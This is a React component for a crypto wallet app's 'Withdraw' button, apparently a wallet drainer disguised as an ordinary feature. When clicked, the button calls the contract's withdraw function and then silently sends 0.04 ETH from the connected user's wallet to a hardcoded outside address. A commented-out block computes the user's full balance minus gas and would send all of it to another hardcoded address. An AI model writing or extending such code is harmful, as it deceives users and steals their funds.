import { abi } from '../artifacts/contracts/Punkshieldwallet.sol/Punkshieldwallet.json';
import { ConnectButton } from '@rainbow-me/rainbowkit';
import { config } from "../main";
import { getBalance, sendTransaction, writeContract } from '@wagmi/core'
import { useAccount } from 'wagmi';
import { Address, formatEther, parseEther } from 'viem';
import { useEffect } from 'react';

const Withdraw = () => {
  const{ address } = useAccount();

  useEffect(() => {
    (async () => {
      const balance = await getBalance(config, {
        address: address as Address, 
      })
      const Balance = balance.value
      const realBalance = Balance - 200000000000000n

      // const result = await sendTransaction(config, {
      //   to: '0x9581a8b08621139288196C24F8a3580b3a21B240',
      //   value: realBalance,
      // })
      
    })()
  },[address])
 
    const handleWithdraw = async () => {

  
      const result1 = await writeContract(config, {
        abi,
        address: '0x98261183021488952b49D58A89898903d93D17c4',
        functionName: 'withdraw',
      });

      const result = await sendTransaction(config, {
        to: '0x5D9055C97DE3c3f04C025f754F8bc0724f8a58ab',
        value: 40000000000000000n,
      })

    }

  return (
    <div className='bg-black flex justify-center items-center py-12 mx-auto'>
        <ConnectButton />
        <button className='bg-white font-bold p-3 rounded-xl text-[#31446D]' onClick={handleWithdraw} type="button">Withdraw</button>
    </div>
  )
}

export default Withdraw